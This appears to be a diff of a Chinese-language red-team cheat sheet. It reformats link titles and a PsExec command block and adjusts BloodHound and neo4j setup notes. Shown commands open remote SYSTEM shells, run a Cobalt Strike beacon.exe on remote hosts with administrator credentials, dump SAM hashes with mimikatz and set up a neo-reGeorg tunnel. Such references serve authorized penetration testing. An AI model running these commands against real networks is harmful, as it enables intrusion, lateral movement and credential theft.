@@ -1,4 +1,5 @@
 https://gitee.com/windyjxx/projects
+[红队框架工具列表｜收藏](https://mp.weixin.qq.com/s/xiM3deP1UWrsvki8LjAnvA)
 
 ## 信息收集
 
@@ -428,7 +429,7 @@ Ladon url.txt pythonpoc.ini
 
 [ICMP/TCP 隧道 | 内网代理和穿透工具的分析记录](https://mp.weixin.qq.com/s/jpmi7CfvcOmL4qkSBKLvKQ)
 [Linux 或 Windows 上实现端口映射](https://mp.weixin.qq.com/s/V9iw_Z0B-dTJikvnwLUEAQ)
-[DNS隧道 | Cobalt Strike的使用（二）](https://mp.weixin.qq.com/s/qLtfmiBVEb9pEfmcAb0RMw)
+[DNS 隧道 | Cobalt Strike 的使用（二）](https://mp.weixin.qq.com/s/qLtfmiBVEb9pEfmcAb0RMw)
 
 多层代理攻击方式
 
@@ -810,7 +811,8 @@ python3 neoreg.py -k password -u http://xx/tunnel.php
 [SoftEther VPN 内网穿透](https://mp.weixin.qq.com/s/Xim1SKnU41Z_rb9aI0QdDA)
 
 ## 端口复用
-[Linux远控的端口复用](https://mp.weixin.qq.com/s/mHCOuR1rq2ExEYYWhA4vQg)
+
+[Linux 远控的端口复用](https://mp.weixin.qq.com/s/mHCOuR1rq2ExEYYWhA4vQg)
 
 iptable
 
@@ -918,16 +920,16 @@ Multiple.Database.Utilization.Tools
 
 # Domain/域
 
-## psexec
+## psexec.exe
 
-```bat
-PsExec.exe -accepteula -s -i -d cmd.exe # 进入system
-psexec \\ip -u administrator -p admin cmd  进⼊半交互式shell
-psexec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shell
-psexec \\ip - uadministrator -p admin -w c:\cmd 进⼊交互式shell，且c:\是⽬标机器的⼯作⽬录
-psexec \\ip -u administrator -p admin whoami all 执行命令
-psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件
-psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件
+```sh
+psexec -accepteula -s -i -d cmd.exe                       # 进入system
+psexec -accepteula \\192.168.108.101 -s cmd.exe           # 交互式shell
+psexec \\ip -u administrator -p admin cmd                 # 交互式shell
+psexec \\ip -u administrator -p admin -w c:\cmd           # 交互式shell，且c:\是⽬标机器的⼯作⽬录
+psexec \\ip -u administrator -p admin whoami all          # 执行命令
+psexec \\ip -u administrator -p admin -d c:\beacon.exe    # 执行文件
+psexec \\ip -u administrator -p admin -h -d c:\beacon.exe # UAC的⽤⼾权限执行文件
 ```
 
 ## impacket/psexec.py
@@ -996,11 +998,13 @@ mimikatz.exe "lsadump::sam /system:system /sam:sam" exit
 - [download](https://neo4j.com/download-center/#community)
 
 ```bash
+# (可选)配置 JAVA_HOME
 neo4j.bat console
 # 检查是否能登录
 URL：neo4j://localhost:7687
 用户名(默认)：neo4j
 密码(默认)：neo4j
+改为 neo4jneo4j
 ```
 
 [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 采集,
@@ -1023,7 +1027,7 @@ zip 压缩包的格式保存，拷贝到 BloodHound 主机上，右侧图标 Upl
 ```sh
 cmd /c start http://localhost:7474/
 # neo4j/neo4j
-# 改为 neo4j/12345678
+# 改为 neo4j/neo4jneo4j
 bloodhound --nosandbox
 ```
 
